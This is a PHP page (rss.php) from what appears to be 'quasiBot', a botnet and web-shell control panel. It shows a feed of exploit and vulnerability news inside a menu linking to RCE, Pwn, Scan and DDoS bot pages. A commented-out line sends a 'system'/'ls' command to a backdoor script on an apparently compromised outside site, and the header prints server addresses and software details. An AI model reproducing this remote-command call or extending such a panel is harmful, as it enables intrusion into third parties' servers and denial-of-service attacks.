<?php

require('config.php');
//conn("http://pysio.pl/include/register_lib.php?_=system&__=ls");
checksql();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | rss</title>
    <link href="style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
$quotes=array("&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;  <font size='1' color='gray'>Anthony J. D'Angelo</font>","&quot;The difference between stupidity and genius is that genius has its limits&quot;  <font size='1' color='gray'>Albert Einstein</font>","&quot;As a young boy, I was taught in high school that hacking was cool.&quot;  <font size='1' color='gray'>Kevin Mitnick</font>", "&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;  <font size='1' color='gray'>Steve Wozniak</font>","&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;  <font size='1' color='gray'>Cory Doctorow</font>", "&quot;It’s hardware that makes a machine fast. It’s software that makes a fast machine slow.&quot;  <font size='1' color='gray'>Craig Bruce</font>", "&quot;The function of good software is to make the complex appear to be simple.&quot;  <font size='1' color='gray'>Grady Booch</font>", "&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Tell me what you need and I'll tell you how to get along without it.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Fuck shit up!&quot;  <font size='1' color='gray'>Smash</font>");
$quote = $quotes[array_rand($quotes)];
echo '<p>'.$quote.'</p>';
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
 <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">
                      <div class="post" name="top" >
                    <h2 class="title"><center><a href="#1337day">1337day</a> - <a href="#NVD">Nation Vuln Database</a> - <a href="#securityfocus">Security Focus</a> - <a href="#cxsecurity">cxsecurity</a></center></h2>
                    </div>
                      <div class="post">
                        <h2 class="title"><a name="1337day" href="#top" >1337day</a></h2>
                        <div class="entry">
                            <p class="meta">1337day.com</p>

    <?php
    $rss = new DOMDocument();
    $rss->load('http://1337day.com/rss');
    $feed = array();
    foreach ($rss->getElementsByTagName('item') as $node) {
    $item = array (
    'title' => $node->getElementsByTagName('title')->item(0)->nodeValue,
    'desc' => $node->getElementsByTagName('description')->item(0)->nodeValue,
    'link' => $node->getElementsByTagName('link')->item(0)->nodeValue,
    'date' => $node->getElementsByTagName('pubDate')->item(0)->nodeValue,
    );
    array_push($feed, $item);
    }
    $limit = 10;
    for($x=0;$x<$limit;$x++) {
    $title = str_replace(' & ', ' &amp; ', $feed[$x]['title']);
    $link = $feed[$x]['link'];
    $description = $feed[$x]['desc'];
    $date = date('d.m.y', strtotime($feed[$x]['date']));
    echo '<p><strong><a href="'.$link.'" title="'.$title.'">'.$title.'</a></strong><br />';
    echo '<small><em>Opublikowano '.$date.'</em></small></p>';
    echo '<p>'.$description.'</p>';
    }
    ?>

                        </div>
                    </div>
                    
                    <div class="post">
                        <h2 class="title"><a name="NVD" href="#top" >National Vulnerabilit Database</a></h2>
                        <div class="entry">
                            <p class="meta">nvd.nist.gov</p>

    <?php
   rss();
    ?>

                        </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="index.php">Index</a></li>
                                <li><a href="settings.php">Settings</a></li>
                                <li><a href="rss.php"><b>RSS</b></a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="rce.php">RCE</a></li>
                                <li><a href="scan.php">Scan</a></li>
                                <li><a href="pwn.php">Pwn</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="sql.php">MySQL Manager</a></li>
                                <li><a href="https://github.com/Smaash/hostscan/">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="ddos.php">DDoS</a></li>
                                <li><a href="more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
